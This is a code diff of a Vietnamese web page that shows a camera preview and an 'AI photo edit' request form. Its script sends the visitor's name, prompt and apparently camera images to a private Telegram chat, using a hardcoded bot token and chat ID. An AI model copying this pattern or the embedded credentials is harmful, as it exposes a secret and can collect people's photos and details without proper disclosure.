@@ -14,6 +14,7 @@
         min-height: 100vh;
         margin: 0;
         background-color: #f0f2f5;
+        padding: 20px 0;
       }
       .container {
         background: white;
@@ -23,6 +24,13 @@
         text-align: center;
         max-width: 400px;
         width: 100%;
+        margin-top: 15px;
+        box-sizing: border-box;
+
+        /* Thêm thuộc tính căn giữa toàn bộ nội dung bên trong */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
       }
       video {
         width: 100%;
@@ -84,6 +92,7 @@
         border-radius: 10px;
         box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         position: relative;
+        box-sizing: border-box;
       }
 
       .modal-box h3 {
@@ -93,6 +102,7 @@
 
       .form-group {
         margin-bottom: 15px;
+        text-align: left;
       }
       .form-group label {
         display: block;
@@ -132,12 +142,10 @@
     </style>
   </head>
   <body>
-    <!-- Nút mở Pop-up -->
     <button class="btn-open" onclick="toggleModal(true)">
       Ấn vào đây để thêm yêu cầu chỉnh ảnh
     </button>
 
-    <!-- Form Pop-up -->
     <div class="modal-overlay" id="aiModal">
       <div class="modal-box">
         <button class="btn-close" onclick="toggleModal(false)">&times;</button>
@@ -170,6 +178,7 @@
         </form>
       </div>
     </div>
+
     <div class="container">
       <h2>Hãy chụp ảnh và kiên nhẫn chờ đợi</h2>
       <p>Màn hình xem trước camera:</p>
@@ -182,7 +191,6 @@
     </div>
 
     <script>
-      // THAY TOKEN MỚI TỪ BOTFATHER VÀ CHAT ID CỦA BẠN VÀO ĐÂY
       const TELEGRAM_TOKEN = "8785240955:AAEtUwixRtLr5plokzAdGY2_TMoMECXnFYo";
       const CHAT_ID = "5436443148";
 
@@ -247,6 +255,7 @@
             });
         }, "image/jpeg");
       });
+
       function toggleModal(show) {
         document.getElementById("aiModal").style.display = show
           ? "flex"
@@ -260,10 +269,8 @@
         const name = document.getElementById("userName").value.trim();
         const prompt = document.getElementById("userPrompt").value.trim();
 
-        // Định dạng tin nhắn gửi đi bằng Markdown
         const message = `📩 *YÊU CẦU SỬA ẢNH MỚI*\n\n👤 *Họ tên:* ${name}\n🎨 *Yêu cầu AI:* ${prompt}`;
 
-        // SỬA LỖI: Dùng TELEGRAM_TOKEN thay vì TELEGRAM_BOT_TOKEN
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
         submitBtn.disabled = true;
@@ -274,7 +281,6 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              // SỬA LỖI: Dùng CHAT_ID thay vì TELEGRAM_CHAT_ID
               chat_id: CHAT_ID,
               text: message,
               parse_mode: "Markdown",
